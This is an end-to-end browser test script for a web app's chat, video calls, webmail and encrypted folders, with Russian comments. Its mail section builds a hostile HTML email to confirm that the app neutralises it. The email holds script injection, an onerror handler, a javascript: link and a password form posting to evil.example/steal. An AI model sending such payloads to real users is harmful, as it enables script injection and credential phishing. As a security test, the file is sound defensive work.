// Сквозной тест чата и видеозвонка в настоящем браузере.
//
//   CB_URL=http://127.0.0.1:8080 node scripts/e2e_browser.mjs
//
// Запускает Chrome без окна с поддельными камерой и микрофоном, открывает две вкладки от разных
// пользователей и проверяет: сообщение доходит, входящий звонок показывается, WebRTC соединяется
// и видео с другой стороны действительно идёт. Управление — Chrome DevTools Protocol (без зависимостей).
//
// Вход — Basic-авторизация через заголовок, а не /api/auth/login: у входа по паролю лимит
// 10 попыток за 5 минут с IP, и в CI его расходуют другие сценарии.
// Переменные: CHROME — путь к браузеру, SHOT — куда сохранить снимок экрана звонка.
import { spawn, execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const B = process.env.CB_URL || 'http://127.0.0.1:8080';
const PORT = 9333;
let fails = 0;
const check = (cond, msg) => { console.log((cond ? 'OK   ' : 'FAIL ') + msg); if (!cond) fails++; };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const basic = (u, p) => 'Basic ' + Buffer.from(`${u}:${p}`).toString('base64');

function findChrome() {
  if (process.env.CHROME) return process.env.CHROME;
  const win = ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'];
  for (const p of win) if (existsSync(p)) return p;
  for (const n of ['google-chrome', 'google-chrome-stable', 'chromium', 'chromium-browser']) {
    try { return execFileSync('which', [n]).toString().trim(); } catch (_) {}
  }
  throw new Error('Chrome не найден — укажите путь в CHROME');
}

// ---------- минимальный клиент DevTools Protocol ----------
class CDP {
  constructor(url) {
    this.ws = new WebSocket(url);
    this.id = 0; this.pending = new Map(); this.handlers = [];
    this.ws.onmessage = e => {
      const m = JSON.parse(e.data);
      if (m.id && this.pending.has(m.id)) {
        const { res, rej } = this.pending.get(m.id); this.pending.delete(m.id);
        m.error ? rej(new Error(m.error.message)) : res(m.result);
      } else if (m.method) for (const h of this.handlers) h(m);
    };
    this.ready = new Promise((res, rej) => { this.ws.onopen = res; this.ws.onerror = rej; });
  }
  send(method, params = {}, sessionId) {
    const id = ++this.id;
    this.ws.send(JSON.stringify({ id, method, params, sessionId }));
    return new Promise((res, rej) => this.pending.set(id, { res, rej }));
  }
}

class Page {
  constructor(cdp, sessionId, name) { this.cdp = cdp; this.s = sessionId; this.name = name; this.errors = []; }
  send(m, p) { return this.cdp.send(m, p, this.s); }
  async eval(expr) {
    const r = await this.send('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true });
    if (r.exceptionDetails) throw new Error(`${this.name}: ${r.exceptionDetails.exception?.description || r.exceptionDetails.text}`);
    return r.result.value;
  }
  async waitFor(expr, timeout = 10000) {
    const end = Date.now() + timeout;
    while (Date.now() < end) {
      try { if (await this.eval(expr)) return true; } catch (_) {}
      await sleep(200);
    }
    return false;
  }
}

async function openPage(cdp, name, auth) {
  const { browserContextId } = await cdp.send('Target.createBrowserContext'); // отдельные cookie для каждого пользователя
  const { targetId } = await cdp.send('Target.createTarget', { url: 'about:blank', browserContextId });
  const { sessionId } = await cdp.send('Target.attachToTarget', { targetId, flatten: true });
  const p = new Page(cdp, sessionId, name);
  cdp.handlers.push(m => {
    if (m.sessionId !== sessionId) return;
    if (m.method === 'Runtime.exceptionThrown') p.errors.push(m.params.exceptionDetails.exception?.description || m.params.exceptionDetails.text);
  });
  await p.send('Runtime.enable');
  await p.send('Page.enable');
  await p.send('Network.enable');
  await p.send('Network.setExtraHTTPHeaders', { headers: { Authorization: auth } });
  await p.send('Emulation.setFocusEmulationEnabled', { enabled: true }); // вкладка «видима»: иначе сообщения не отмечаются прочитанными
  await p.send('Browser.grantPermissions', { origin: new URL(B).origin, permissions: ['videoCapture', 'audioCapture'], browserContextId }).catch(() => {});
  await p.send('Page.navigate', { url: B + '/#/talk' });
  return p;
}

// smtpSend — письмо напрямую по SMTP (тестовый сервер mailtest: AUTH PLAIN username/password, без TLS).
async function smtpSend(port, from, to, data) {
  const { connect } = await import('node:net');
  const sock = connect(port, '127.0.0.1');
  let buf = '';
  const waitCode = () => new Promise((res, rej) => {
    const t = setTimeout(() => rej(new Error('SMTP: нет ответа')), 5000);
    const on = () => {
      const lines = buf.split('\r\n');
      const last = lines.findIndex(l => /^\d{3} /.test(l)); // последняя строка ответа: «250 …» (не «250-…»)
      if (last >= 0) { const code = +lines[last].slice(0, 3); buf = lines.slice(last + 1).join('\r\n'); clearTimeout(t); sock.off('data', h); res(code); }
    };
    const h = d => { buf += d.toString(); on(); };
    sock.on('data', h); on();
  });
  const cmd = async (line, want) => { sock.write(line + '\r\n'); const c = await waitCode(); if (c !== want) throw new Error(`SMTP ${line.split(' ')[0]}: ${c}`); };
  if (await waitCode() !== 220) throw new Error('SMTP: нет приветствия');
  await cmd('EHLO test', 250);
  await cmd('AUTH PLAIN ' + Buffer.from('\0username\0password').toString('base64'), 235);
  await cmd(`MAIL FROM:<${from}>`, 250);
  await cmd(`RCPT TO:<${to}>`, 250);
  await cmd('DATA', 354);
  await cmd(data.replace(/\r\n\./g, '\r\n..') + '\r\n.', 250);
  sock.end('QUIT\r\n');
}

async function api(method, path, auth, body) {
  const r = await fetch(B + path, { method, headers: { Authorization: auth, 'Content-Type': 'application/json' }, body: body && JSON.stringify(body) });
  const t = await r.text();
  let data = null; try { data = JSON.parse(t); } catch (_) {}
  return { status: r.status, data };
}

// ---------- пользователи ----------
const admin = basic('andrey', 'secret123');
let me = await api('GET', '/api/me', admin);
if (me.status === 401) { await api('POST', '/api/auth/register', admin, { username: 'andrey', password: 'secret123' }); me = await api('GET', '/api/me', admin); }
check(me.status === 200, 'администратор доступен');
const users = { ana: ['web_ana', 'ana-12345'], bob: ['web_bob', 'bob-12345'] };
for (const [u, p] of Object.values(users)) await api('POST', '/api/admin/users', admin, { username: u, password: p });
const list = (await api('GET', '/api/admin/users', admin)).data;
const bobId = list.find(x => x.username === 'web_bob')?.id;
check(!!bobId, 'созданы пользователи для браузерного теста');

// ---------- браузер ----------
const profile = mkdtempSync(join(tmpdir(), 'cb-chrome-'));
const args = [
  '--headless=new', `--remote-debugging-port=${PORT}`, `--user-data-dir=${profile}`,
  '--use-fake-ui-for-media-stream', '--use-fake-device-for-media-stream', // поддельные камера и микрофон
  '--autoplay-policy=no-user-gesture-required',
  '--disable-features=WebRtcHideLocalIpsWithMdns', // обе вкладки на одной машине: обходимся без mDNS
  '--no-first-run', '--no-default-browser-check', '--window-size=1280,800',
  ...(process.platform === 'linux' ? ['--no-sandbox'] : []), 'about:blank',
];
const chrome = spawn(findChrome(), args, { stdio: 'ignore' });
let wsUrl;
for (let i = 0; i < 50 && !wsUrl; i++) {
  try { wsUrl = (await (await fetch(`http://127.0.0.1:${PORT}/json/version`)).json()).webSocketDebuggerUrl; } catch (_) { await sleep(200); }
}
if (!wsUrl) { console.log('FAIL Chrome не запустился'); process.exit(1); }
const cdp = new CDP(wsUrl);
await cdp.ready;

try {
  const A = await openPage(cdp, 'ana', basic(...users.ana));
  const Bp = await openPage(cdp, 'bob', basic(...users.bob));
  check(await A.waitFor('typeof Talk !== "undefined" && Talk.peer') && await Bp.waitFor('typeof Talk !== "undefined" && Talk.peer'), 'обе вкладки подключились к потоку событий');

  const room = await A.eval(`api('POST', '/api/talk/direct', { user_id: ${bobId} }).then(r => r.id)`);
  await A.eval(`location.hash = '#/talk/${room}'`);
  check(await A.waitFor(`Talk.view && Talk.view.id === '${room}' && !!document.querySelector('.talk-compose textarea')`), 'ana открыла переписку');

  // сообщение через интерфейс: Enter в поле ввода
  await A.eval(`(() => { const i = document.querySelector('.talk-compose textarea'); i.value = 'Привет из браузера <script>x</script>';
    i.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); })()`);
  check(await Bp.waitFor('Talk.unread >= 1 && !!document.querySelector(\'.talk-item .nav-count\')'), 'у bob появился счётчик непрочитанного');
  await Bp.eval(`location.hash = '#/talk/${room}'`);
  check(await Bp.waitFor(`[...document.querySelectorAll('.msg .txt')].some(e => e.textContent === 'Привет из браузера <script>x</script>')`),
    'bob видит сообщение (HTML показан текстом)');
  check(await Bp.waitFor('Talk.unread === 0'), 'после открытия переписки счётчик обнулился');
  check(await Bp.eval('document.querySelectorAll(".msg script").length') === 0, 'в сообщении нет исполняемого HTML');

  // звонок
  await A.eval(`Call.join('${room}')`);
  check(await A.waitFor(`Call.room === '${room}' && !!document.querySelector('.call')`), 'ana начала звонок, открылось окно звонка');
  check(await Bp.waitFor(`!!document.querySelector('.ring .btn.primary')`), 'bob видит входящий звонок');
  await Bp.eval(`document.querySelector('.ring .btn.primary').click()`);
  const remoteVideo = `(() => { const t = [...Call.tiles].filter(([k]) => k !== 'me');
    return t.length === 1 && t[0][1].video.videoWidth > 0 && t[0][1].video.srcObject.getAudioTracks().length === 1; })()`;
  const connected = `[...Call.pcs.values()].length === 1 && [...Call.pcs.values()][0].pc.connectionState === 'connected'`;
  check(await A.waitFor(connected, 20000) && await Bp.waitFor(connected, 20000), 'WebRTC-соединение установлено');
  check(await A.waitFor(remoteVideo, 15000), 'ana получает видео и звук от bob');
  check(await Bp.waitFor(remoteVideo, 15000), 'bob получает видео и звук от ana');

  await A.eval('Call.toggleMic()');
  check(await A.eval('Call.local.getAudioTracks().every(t => !t.enabled) && Call.btnMic.classList.contains("off")'), 'микрофон выключается');
  await A.eval('Call.toggleMic()');

  if (process.env.SHOT) {
    await sleep(800);
    const { data } = await A.send('Page.captureScreenshot', { format: 'png' });
    writeFileSync(process.env.SHOT, Buffer.from(data, 'base64'));
    console.log('снимок звонка:', process.env.SHOT);
  }

  await Bp.eval('Call.hangup()');
  check(await A.waitFor(`Call.tiles.size === 1 && Call.pcs.size === 0`, 10000), 'bob положил трубку — у ana его плитка исчезла');
  await A.eval('Call.hangup()');
  check(await A.waitFor(`!document.querySelector('.call') && [...document.querySelectorAll('.talk-sys')].some(e => e.textContent.startsWith('Звонок завершён'))`, 10000),
    'звонок завершён, в переписке есть запись о нём');

  // ---------- почта: вредоносное HTML-письмо (если запущен тестовый почтовый сервер) ----------
  if (process.env.MAILTEST_SMTP) {
    const smtpPort = +process.env.MAILTEST_SMTP, imapPort = +(process.env.MAILTEST_IMAP || 1143);
    const evil = '<p id="hello">Здравствуйте!</p><script>parent.__pwned = 1</script>' +
      '<img src="x" onerror="parent.__pwned = 2"><a href="javascript:parent.__pwned=3">ссылка</a>' +
      '<form action="https://evil.example/steal"><input name="password"><button>Войти</button></form>' +
      '<img src="https://tracker.example/pixel.gif">';
    await smtpSend(smtpPort, 'evil@example.org', 'ana@example.org',
      'From: Злоумышленник <evil@example.org>\r\nTo: ana@example.org\r\nSubject: Проверка безопасности\r\n' +
      'MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n' + evil + '\r\n');
    const acc = await A.eval(`api('POST', '/api/mail/accounts', { email: 'ana@example.org', login: 'username', password: 'password',
      imap_host: '127.0.0.1', imap_port: ${imapPort}, imap_sec: 'none', smtp_host: '127.0.0.1', smtp_port: ${smtpPort}, smtp_sec: 'none' }).then(a => a.id)`);
    check(!!acc, 'почта: ящик подключён из браузера');
    await A.eval(`location.hash = '#/mail'`);
    check(await A.waitFor(`[...document.querySelectorAll('.mail-row .subj')].some(e => e.textContent === 'Проверка безопасности')`, 15000), 'почта: письмо в списке');
    await A.eval(`[...document.querySelectorAll('.mail-row')].find(r => r.textContent.includes('Проверка безопасности')).click()`);
    check(await A.waitFor(`!!document.querySelector('iframe.mail-frame')`, 15000), 'почта: письмо открыто в iframe');
    const fr = await A.eval(`(() => { const f = document.querySelector('iframe.mail-frame'); return { sandbox: f.getAttribute('sandbox'), doc: f.srcdoc }; })()`);
    check(!/allow-scripts|allow-same-origin/.test(fr.sandbox), 'почта: iframe без скриптов и без доступа к CloudBox (sandbox: ' + fr.sandbox + ')');
    check(fr.doc.includes('Здравствуйте!') && !/<script|onerror|javascript:|<form|<input/i.test(fr.doc), 'почта: скрипты, обработчики, javascript:-ссылки и формы вырезаны');
    check(/img-src data:;/.test(fr.doc) && !!(await A.eval(`!!document.querySelector('.mail-banner')`)), 'почта: картинки из интернета заблокированы, показано предупреждение');
    await sleep(1000);
    check(await A.eval('window.__pwned === undefined'), 'почта: код из письма не выполнился в CloudBox');
    await A.eval(`api('DELETE', '/api/mail/accounts/${acc}')`);
  }

  // ---------- E2E-папки: настоящее шифрование WebCrypto в браузере ----------
  const r = await A.eval(`(async () => {
    const rec = await e2eSetup('очень длинная кодовая фраза для теста');
    const folder = await api('POST', '/api/e2e/folders', { parent: '', name: 'Сейф браузера' });
    const text = 'Совершенно секретно: план похода. '.repeat(4000); // ~250 КБ — несколько сегментов по 64 КиБ
    const node = await e2eUpload(new File([text], 'секрет.txt', { type: 'text/plain' }), folder.id);
    const raw = new Uint8Array(await (await fetch('/api/files/' + node.id + '/content')).arrayBuffer());
    const rawText = new TextDecoder().decode(raw);
    const entry = (await e2eLoadMeta(folder.id)).meta.files[node.name];
    const back = await (await e2eDecrypt(raw.buffer.slice(0), entry)).text();
    const fails = async buf => { try { await e2eDecrypt(buf, entry); return false; } catch (_) { return true; } };
    const t = raw.slice(); t[70000] ^= 1;                  // один байт во втором сегменте
    const swapped = raw.slice(); swapped.set(raw.subarray(12, 12 + 65552), 12 + 65552); // сегмент 0 на место сегмента 1
    // atob отдаёт байты как символы Latin-1 — ищем в них UTF-8 байты имени, а не саму кириллическую строку
    const metaRaw = atob((await api('GET', '/api/e2e/meta/' + folder.id)).data.split('.')[1]);
    const nameBytes = String.fromCharCode(...new TextEncoder().encode('секрет'));
    E2E.vk = null;
    let wrong = false; try { await e2eUnlock('не та фраза', false); } catch (_) { wrong = true; }
    (await e2eUnlock(rec, true)).fill(0);
    const nameAfterRecovery = (await e2eLoadMeta(folder.id)).meta.files[node.name].name;
    return { folder: folder.id, name: node.name, magic: rawText.slice(0, 4), leaked: rawText.includes('Совершенно') || rawText.includes('секрет'),
      size: raw.length, expected: e2eCipherSize(new TextEncoder().encode(text).length), ok: back === text,
      tampered: await fails(t.buffer), truncated: await fails(raw.slice(0, raw.length - 40).buffer), swapped: await fails(swapped.buffer),
      metaLeak: metaRaw.includes(nameBytes), metaLooksPlain: metaRaw.includes('"files"'), wrong, nameAfterRecovery, rec };
  })()`);
  check(/^[0-9a-f]{32}$/.test(r.name), 'E2E: на сервере случайное имя вместо настоящего (' + r.name + ')');
  check(r.magic === 'CBE1' && !r.leaked && r.size === r.expected, 'E2E: на сервере только шифротекст ожидаемого размера, без открытого текста');
  check(r.ok, 'E2E: файл из нескольких сегментов расшифровывается без искажений');
  check(r.tampered && r.truncated && r.swapped, 'E2E: подмена байта, обрезка и перестановка сегментов обнаруживаются');
  check(!r.metaLeak && !r.metaLooksPlain, 'E2E: метаданные на сервере зашифрованы — ни имени файла, ни структуры JSON');
  check(r.wrong && r.nameAfterRecovery === 'секрет.txt', 'E2E: неверная фраза отвергается, ключ восстановления открывает папку');
  check(/^([A-Z2-9]{4}-){12}[A-Z2-9]{4}$/.test(r.rec), 'E2E: ключ восстановления — 52 символа base32 группами по 4');
  await A.eval(`location.hash = '#/e2e/${r.folder}'`);
  check(await A.waitFor(`[...document.querySelectorAll('.e2e-row')].some(e => e.textContent.includes('секрет.txt'))`, 15000), 'E2E: окно папки показывает настоящее имя');

  check(A.errors.length === 0 && Bp.errors.length === 0, 'без ошибок JavaScript' + (A.errors.length + Bp.errors.length ? ': ' + [...A.errors, ...Bp.errors].join(' | ') : ''));
} catch (e) {
  check(false, 'исключение: ' + e.message);
} finally {
  chrome.kill();
  await sleep(500);
  try { rmSync(profile, { recursive: true, force: true }); } catch (_) {}
}
console.log('\nИТОГО ошибок:', fails);
process.exit(fails ? 1 : 0);
